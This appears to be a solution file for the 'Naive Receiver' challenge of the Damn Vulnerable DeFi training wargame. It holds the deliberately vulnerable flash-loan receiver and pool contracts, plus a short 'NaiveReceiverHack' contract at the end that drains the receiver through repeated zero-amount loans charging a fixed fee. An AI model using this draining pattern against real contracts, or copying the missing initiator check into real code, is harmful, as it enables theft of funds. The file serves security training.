// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { SafeTransferLib } from "@solady/utils/SafeTransferLib.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts-v4.7.3/security/ReentrancyGuard.sol";
import { IERC3156FlashBorrower, IERC3156FlashLender } from "@openzeppelin/contracts-v4.7.3/interfaces/IERC3156.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    // @audit
    // @audit-ok
    // @audit-check
    // @audit-issue
    // @audit-info
    // @audit-submitted
    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    )
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != ETH) {
            revert UnsupportedCurrency();
        }

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable { }
}
/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        }
        return 0;
    }

    function flashFee(address token, uint256) external pure returns (uint256) {
        if (token != ETH) {
            revert UnsupportedCurrency();
        }
        return FIXED_FEE;
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    )
        external
        returns (bool)
    {
        if (token != ETH) {
            revert UnsupportedCurrency();
        }

        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if (receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE) {
            revert RepayFailed();
        }

        return true;
    }

    // Allow deposits of ETH
    receive() external payable { }
}

contract NaiveReceiverHack {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function attack() public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 0, "0x");
        }
    }
}
